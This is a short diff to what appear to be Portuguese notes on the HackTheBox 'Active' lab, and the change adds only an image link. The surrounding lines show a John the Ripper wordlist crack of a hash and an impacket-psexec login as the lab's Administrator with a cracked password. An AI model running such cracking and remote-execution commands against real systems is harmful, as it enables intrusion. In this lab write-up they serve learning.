@@ -31,6 +31,8 @@ Aqui sossegado:
     
 ![qownnotes-media-tKQdxa](../../../media/qownnotes-media-tKQdxa.png)
 
+![qownnotes-media-qApPLP](../../.gitbook/assets/qownnotes-media-qApPLP.png)
+
     john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
     
     impacket-psexec 'active.htb/Administrator:Ticketmaster1968@10.10.10.100'
